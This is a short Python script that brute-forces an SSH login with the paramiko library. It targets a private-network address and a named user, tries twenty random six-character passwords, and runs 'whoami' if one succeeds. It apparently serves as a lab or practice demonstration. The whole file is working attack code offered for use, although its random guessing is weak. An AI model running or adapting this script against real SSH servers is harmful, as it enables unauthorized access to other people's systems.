import paramiko
import random
import string
import time
import socket

TARGET_IP = '192.168.122.109'
TARGET_PORT = 22
USERNAME = 'fruitto'
MAX_ATTEMPTS = 20

def generate_random_password(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def ssh_brute_force():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"[*] Starting Brute Force on {USERNAME}@{TARGET_IP}...")

    for i in range(1, MAX_ATTEMPTS + 1):
        password_guess = generate_random_password(length=6)

        try:
            print(f"[{i}/{MAX_ATTEMPTS}] Trying password: {password_guess}", end='\r')
            client.connect(hostname=TARGET_IP, port=TARGET_PORT, username=USERNAME, password=password_guess, timeout=3)
            print(f"\n[+] SUCCESS! Password found: {password_guess}")
            stdin, stdout, stderr = client.exec_command('whoami')
            print(f"Logged in as: {stdout.read().decode().strip()}")
            break

        except paramiko.AuthenticationException:
            pass

        except socket.error:
            print("\n[!] Connection Error (Server might be down or blocking)")
            break

        except Exception as e:
            print(f"\n[!] Error: {e}")
            break

        finally:
            client.close()
            time.sleep(0.1)

    print("\n[*] Test Finished.")

if __name__ == "__main__":
    ssh_brute_force()